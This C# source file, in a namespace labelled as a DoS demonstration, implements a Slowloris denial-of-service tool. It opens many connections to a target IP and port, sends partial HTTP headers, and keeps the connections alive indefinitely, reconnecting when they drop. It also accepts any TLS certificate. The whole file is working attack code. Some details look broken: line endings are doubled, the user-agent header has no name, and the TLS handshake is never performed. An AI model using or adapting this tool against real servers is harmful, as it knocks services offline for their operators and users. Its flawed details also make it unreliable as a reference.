using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Net.Security;
using System.Threading;
using System.Security.Cryptography.X509Certificates;

namespace DoSMethodsDemonstration
{
    class SlowLoris2
    {
        private static List<LorisConnection> connections;

        public SlowLoris2()
        {
            connections = new List<LorisConnection>();
            new Thread(() => keepAliveThread()).Start();
        }

        public static void Attack(string ip, int port, bool useSsl, int count)
        {
            Console.WriteLine("Initializing connections for {0} sockets.", count);
            for (int i = 0; i < count; i++)
            {
                var conn = new LorisConnection(ip, port, useSsl);
                conn.SendHeaders("Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0");
                connections.Add(conn);
            }
        }

        private void keepAliveThread()
        {
            while (true)
            {
                Console.WriteLine("Sending keep alive headers for {0} connections.", connections.Count);
                for (int i = 0; i < connections.Count; i++)
                {
                    try
                    {
                        connections[i].KeepAlive();
                    }
                    catch
                    {
                        // If we get shut down, open a new connection with an identical config.
                        connections[i] = new LorisConnection(connections[i].IP, connections[i].Port, connections[i].UsingSsl);
                    }
                }
                Thread.Sleep(10000);
            }
        }
    }

    public class LorisConnection
    {
        private static Random rnd = new Random();

        public string IP { get; private set; }
        public int Port { get; private set; }
        public bool UsingSsl { get; private set; }

        private StreamWriter writer;

        public LorisConnection(string ip, int port, bool useSsl)
        {
            IP = ip;
            Port = port;
            UsingSsl = useSsl;

            TcpClient client = new TcpClient(ip, port);
            if (UsingSsl)
            {
                SslStream ssl = new SslStream(client.GetStream(), false, new RemoteCertificateValidationCallback(ValidateCert));
                writer = new StreamWriter(ssl);
            }
            else
                writer = new StreamWriter(client.GetStream());
            writer.AutoFlush = true;
        }

        public void SendHeaders(string userAgent)
        {
            writer.WriteLine(string.Format("GET /?{0} HTTP/1.1\r\n", rnd.Next(0, 2000)));
            writer.WriteLine(string.Format("{0}\r\n", userAgent));
            writer.WriteLine("Accept-language: en-US,en,q=0.5\r\n");
        }

        public void KeepAlive()
        {
            writer.WriteLine(string.Format("X-a: {0}\r\n", rnd.Next(1, 5000)));
        }

        public static bool ValidateCert(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {
            return true; // Allow untrusted certificates.
        }
    }
}